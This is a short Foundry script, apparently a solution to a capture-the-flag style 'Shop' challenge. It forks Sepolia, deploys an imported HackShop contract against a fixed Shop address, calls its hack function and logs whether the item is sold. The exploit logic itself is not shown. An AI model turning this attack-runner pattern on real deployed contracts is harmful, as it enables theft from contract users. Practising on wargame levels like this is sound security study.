// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {HackShop, Shop} from "../src/Shop.sol";

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address shopContract = 0x5C75A927c25e7A38426c04e422db27df585D7A00;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        console.log("Initial State::");

        bool result = Shop(shopContract).isSold();

        console.log("InitialState:", result);

        HackShop hackContract = new HackShop();

        hackContract.hackShop(shopContract);

        result = Shop(shopContract).isSold();

        console.log("FinalState:", result);
        vm.stopBroadcast();
    }
}
